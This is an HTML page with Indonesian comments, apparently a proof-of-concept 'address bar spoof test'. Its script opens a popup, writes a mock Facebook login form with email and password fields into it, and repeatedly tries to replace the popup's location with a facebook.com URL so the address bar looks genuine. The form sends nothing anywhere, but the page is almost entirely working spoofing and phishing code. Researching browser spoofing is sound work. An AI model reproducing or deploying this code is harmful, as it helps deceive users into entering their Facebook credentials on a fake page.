<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Address Bar Spoof Test</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
        .btn-test { padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 8px; border: none; background: #1877f2; color: white; font-weight: bold; }
    </style>
</head>
<body>

    <h2>Simulasi Kerentanan Spoofing</h2>
    <p>Klik tombol di bawah untuk menguji respons browser terhadap manipulasi URL bar.</p>

    <button class="btn-test" onclick="runDemo();">Test Spoofing</button>

    <script>
        function runDemo() {
            // Konten HTML yang meniru tampilan di gambar Anda
            var htmlContent = `
                <html>
                <head>
                    <title>facebook.com</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <style>
                        body { font-family: "Times New Roman", serif; padding: 20px; background: white; }
                        h2 { font-weight: normal; font-size: 24px; margin-bottom: 20px; }
                        label { display: block; margin-top: 10px; font-size: 18px; }
                        input { width: 100%; max-width: 300px; padding: 5px; border: 1px solid #767676; margin-top: 5px; }
                        .header-mock { border-bottom: 1px solid #ccc; padding-bottom: 10px; margin-bottom: 20px; color: #555; font-family: sans-serif; font-size: 14px; text-align: center; }
                    </style>
                </head>
                <body>
                    <div class="header-mock">facebook.com</div>
                    <h2>Fake Facebook login</h2>
                    <label>email</label>
                    <input type="text">
                    <label>password</label>
                    <input type="password">
                </body>
                </html>
            `;

            // Encode konten ke Base64 agar bisa diproses sebagai string tunggal
            var encodedPage = btoa(htmlContent);

            // Membuka jendela baru
            var x = window.open('', '_blank', 'width=400,height=600');

            // Eksekusi Spoofing: Mencoba mengganti URL secara paksa
            // Catatan: Ini sering diblokir oleh sistem keamanan browser modern
            var spoofInterval = setInterval(function() {
                try {
                    x.location.replace('https://www.facebook.com:8080');
                } catch(e) {}
            }, 5);

            // Menulis konten palsu ke jendela yang baru dibuka
            x.document.write(atob(encodedPage));

            // Matikan interval setelah 3 detik untuk menghemat resource
            setTimeout(function() {
                clearInterval(spoofInterval);
            }, 3000);
        }
    </script>
</body>
</html>
